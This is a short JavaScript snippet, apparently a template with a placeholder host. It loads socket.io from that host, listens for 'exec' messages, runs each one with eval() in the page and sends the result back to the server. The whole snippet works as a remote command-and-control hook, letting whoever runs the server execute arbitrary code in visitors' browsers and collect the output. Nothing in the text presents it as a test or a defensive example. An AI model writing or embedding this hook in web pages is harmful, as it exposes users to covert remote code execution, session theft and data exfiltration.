$.getScript('//{~socketiourl~}/dist/js/socket.io.js',initK);

function initK(){
    var socket = io.connect('//{~socketiourl~}/user');
    socket.on('exec', function (data) {
        console.log(data);
        var callbackData = eval(data);
        socket.emit('callbackExec', callbackData);
    });
}
